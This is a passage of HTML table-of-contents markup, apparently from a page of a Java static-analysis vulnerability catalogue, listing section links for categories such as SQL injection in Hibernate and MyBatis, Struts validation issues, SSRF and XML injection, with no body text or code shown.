toc-level-4"><a class="toc-link" href="#SQL-Injection-Hibernate"><span class="toc-number">1.6.64.</span> <span class="toc-text">SQL Injection: Hibernate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-314"><span class="toc-number">1.6.64.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-315"><span class="toc-number">1.6.64.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-313"><span class="toc-number">1.6.64.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-312"><span class="toc-number">1.6.64.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-JDO"><span class="toc-number">1.6.65.</span> <span class="toc-text">SQL Injection: JDO</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-315"><span class="toc-number">1.6.65.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-316"><span class="toc-number">1.6.65.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-314"><span class="toc-number">1.6.65.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-313"><span class="toc-number">1.6.65.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-MyBatis-Mapper"><span class="toc-number">1.6.66.</span> <span class="toc-text">SQL Injection: MyBatis Mapper</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-316"><span class="toc-number">1.6.66.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-317"><span class="toc-number">1.6.66.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-315"><span class="toc-number">1.6.66.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-314"><span class="toc-number">1.6.66.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Persistence"><span class="toc-number">1.6.67.</span> <span class="toc-text">SQL Injection: Persistence</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-317"><span class="toc-number">1.6.67.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-318"><span class="toc-number">1.6.67.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-316"><span class="toc-number">1.6.67.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-315"><span class="toc-number">1.6.67.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-iBatis-Data-Map"><span class="toc-number">1.6.68.</span> <span class="toc-text">SQL Injection: iBatis Data Map</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-318"><span class="toc-number">1.6.68.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-319"><span class="toc-number">1.6.68.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-317"><span class="toc-number">1.6.68.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-316"><span class="toc-number">1.6.68.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.6.69.</span> <span class="toc-text">Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-319"><span class="toc-number">1.6.69.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-320"><span class="toc-number">1.6.69.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-318"><span class="toc-number">1.6.69.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-317"><span class="toc-number">1.6.69.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Template-Injection"><span class="toc-number">1.6.70.</span> <span class="toc-text">Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-320"><span class="toc-number">1.6.70.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-321"><span class="toc-number">1.6.70.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-319"><span class="toc-number">1.6.70.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-318"><span class="toc-number">1.6.70.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session-Puzzling-Spring"><span class="toc-number">1.6.71.</span> <span class="toc-text">Session Puzzling: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-321"><span class="toc-number">1.6.71.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-322"><span class="toc-number">1.6.71.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-320"><span class="toc-number">1.6.71.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-319"><span class="toc-number">1.6.71.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation"><span class="toc-number">1.6.72.</span> <span class="toc-text">Setting Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-322"><span class="toc-number">1.6.72.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-323"><span class="toc-number">1.6.72.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-321"><span class="toc-number">1.6.72.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-320"><span class="toc-number">1.6.72.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Beans-Injection"><span class="toc-number">1.6.73.</span> <span class="toc-text">Spring Beans Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-323"><span class="toc-number">1.6.73.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-324"><span class="toc-number">1.6.73.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-322"><span class="toc-number">1.6.73.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-321"><span class="toc-number">1.6.73.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Action-Field-Without-Validator"><span class="toc-number">1.6.74.</span> <span class="toc-text">Struts 2: Action Field Without Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-324"><span class="toc-number">1.6.74.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-325"><span class="toc-number">1.6.74.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-323"><span class="toc-number">1.6.74.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-322"><span class="toc-number">1.6.74.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Action-Field-Validators"><span class="toc-number">1.6.75.</span> <span class="toc-text">Struts 2: Duplicate Action Field Validators</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-325"><span class="toc-number">1.6.75.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-326"><span class="toc-number">1.6.75.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-324"><span class="toc-number">1.6.75.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-323"><span class="toc-number">1.6.75.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Validation-Files"><span class="toc-number">1.6.76.</span> <span class="toc-text">Struts 2: Duplicate Validation Files</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-326"><span class="toc-number">1.6.76.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-327"><span class="toc-number">1.6.76.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-325"><span class="toc-number">1.6.76.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-324"><span class="toc-number">1.6.76.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Duplicate-Validators"><span class="toc-number">1.6.77.</span> <span class="toc-text">Struts 2: Duplicate Validators</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-327"><span class="toc-number">1.6.77.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-328"><span class="toc-number">1.6.77.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-326"><span class="toc-number">1.6.77.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-325"><span class="toc-number">1.6.77.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Undeclared-Validator"><span class="toc-number">1.6.78.</span> <span class="toc-text">Struts 2: Undeclared Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-328"><span class="toc-number">1.6.78.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-329"><span class="toc-number">1.6.78.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-327"><span class="toc-number">1.6.78.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-326"><span class="toc-number">1.6.78.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Unvalidated-Action"><span class="toc-number">1.6.79.</span> <span class="toc-text">Struts 2: Unvalidated Action</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-329"><span class="toc-number">1.6.79.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-330"><span class="toc-number">1.6.79.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-328"><span class="toc-number">1.6.79.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-327"><span class="toc-number">1.6.79.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Validation-File-Without-Action"><span class="toc-number">1.6.80.</span> <span class="toc-text">Struts 2: Validation File Without Action</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-330"><span class="toc-number">1.6.80.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-331"><span class="toc-number">1.6.80.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-329"><span class="toc-number">1.6.80.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-328"><span class="toc-number">1.6.80.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Validator-Without-Action-Field"><span class="toc-number">1.6.81.</span> <span class="toc-text">Struts 2: Validator Without Action Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-331"><span class="toc-number">1.6.81.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-332"><span class="toc-number">1.6.81.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-330"><span class="toc-number">1.6.81.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-329"><span class="toc-number">1.6.81.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Duplicate-Validation-Forms"><span class="toc-number">1.6.82.</span> <span class="toc-text">Struts: Duplicate Validation Forms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-332"><span class="toc-number">1.6.82.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-333"><span class="toc-number">1.6.82.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-331"><span class="toc-number">1.6.82.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-330"><span class="toc-number">1.6.82.4.</span> <span class="toc-text">REFERENCES</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-333"><span class="toc-number">1.6.82.5.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-332"><span class="toc-number">1.6.82.6.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-331"><span class="toc-number">1.6.82.7.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Form-Does-Not-Extend-Validation-Class"><span class="toc-number">1.6.83.</span> <span class="toc-text">Struts: Form Does Not Extend Validation Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-334"><span class="toc-number">1.6.83.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-334"><span class="toc-number">1.6.83.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-333"><span class="toc-number">1.6.83.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-332"><span class="toc-number">1.6.83.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Form-Field-Without-Validator"><span class="toc-number">1.6.84.</span> <span class="toc-text">Struts: Form Field Without Validator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-335"><span class="toc-number">1.6.84.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-335"><span class="toc-number">1.6.84.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-334"><span class="toc-number">1.6.84.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-333"><span class="toc-number">1.6.84.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Plugin-Framework-Not-In-Use"><span class="toc-number">1.6.85.</span> <span class="toc-text">Struts: Plugin Framework Not In Use</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-336"><span class="toc-number">1.6.85.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-336"><span class="toc-number">1.6.85.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-335"><span class="toc-number">1.6.85.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-334"><span class="toc-number">1.6.85.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unused-Action-Form"><span class="toc-number">1.6.86.</span> <span class="toc-text">Struts: Unused Action Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-337"><span class="toc-number">1.6.86.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-337"><span class="toc-number">1.6.86.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-336"><span class="toc-number">1.6.86.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-335"><span class="toc-number">1.6.86.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unused-Validation-Form"><span class="toc-number">1.6.87.</span> <span class="toc-text">Struts: Unused Validation Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-338"><span class="toc-number">1.6.87.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-338"><span class="toc-number">1.6.87.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-337"><span class="toc-number">1.6.87.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-336"><span class="toc-number">1.6.87.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unvalidated-Action-Form"><span class="toc-number">1.6.88.</span> <span class="toc-text">Struts: Unvalidated Action Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-339"><span class="toc-number">1.6.88.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-339"><span class="toc-number">1.6.88.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-338"><span class="toc-number">1.6.88.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-337"><span class="toc-number">1.6.88.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Validator-Turned-Off"><span class="toc-number">1.6.89.</span> <span class="toc-text">Struts: Validator Turned Off</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-340"><span class="toc-number">1.6.89.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-340"><span class="toc-number">1.6.89.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-339"><span class="toc-number">1.6.89.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-338"><span class="toc-number">1.6.89.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Validator-Without-Form-Field"><span class="toc-number">1.6.90.</span> <span class="toc-text">Struts: Validator Without Form Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-341"><span class="toc-number">1.6.90.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-341"><span class="toc-number">1.6.90.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-340"><span class="toc-number">1.6.90.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-339"><span class="toc-number">1.6.90.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-JNI"><span class="toc-number">1.6.91.</span> <span class="toc-text">Unsafe JNI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-342"><span class="toc-number">1.6.91.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-342"><span class="toc-number">1.6.91.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-341"><span class="toc-number">1.6.91.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-340"><span class="toc-number">1.6.91.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-JSNI"><span class="toc-number">1.6.92.</span> <span class="toc-text">Unsafe JSNI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-343"><span class="toc-number">1.6.92.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-343"><span class="toc-number">1.6.92.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-342"><span class="toc-number">1.6.92.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-341"><span class="toc-number">1.6.92.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Reflection"><span class="toc-number">1.6.93.</span> <span class="toc-text">Unsafe Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-344"><span class="toc-number">1.6.93.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-344"><span class="toc-number">1.6.93.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-343"><span class="toc-number">1.6.93.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-342"><span class="toc-number">1.6.93.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Entity-Expansion-Injection"><span class="toc-number">1.6.94.</span> <span class="toc-text">XML Entity Expansion Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-345"><span class="toc-number">1.6.94.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-345"><span class="toc-number">1.6.94.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-344"><span class="toc-number">1.6.94.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-343"><span class="toc-number">1.6.94.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-External-Entity-Injection"><span class="toc-number">1.6.95.</span> <span class="toc-text">XML External Entity Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-346"><span class="toc-number">1.6.95.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-346"><span class="toc-number">1.6.95.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-345"><span class="toc-number">1.6.95.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-344"><span class="toc-number">1.6.95.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Injection"><span class="toc-number">1.6.96.</span> <span class="toc-text">XML Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-347"><span class="toc-number">1.6.96.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-347"><span class="toc-number">1.6.96.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-346"><span class="toc-number">1.6.96.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-345"><span class="toc-number">1.6.96.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XPath-Injection"><span class="toc-number">1.6.97.</span> <span class="toc-text">XPath Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-348"><span class="toc-number">1.6.97.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-348"><span class="toc-number">1.6.97.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-347"><span class="toc-number">1.6.97.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-346"><span class="toc-number">1.6.97.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XQuery-Injection"><span class="toc-number">1.6.98.</span> <span class="toc-text">XQuery Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-349"><span class="toc-number">1.6.98.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-349"><span class="toc-number">1.6.98.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-348"><span class="toc-number">1.6.98.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-347"><span class="toc-number">1.6.98.4.</span> <span 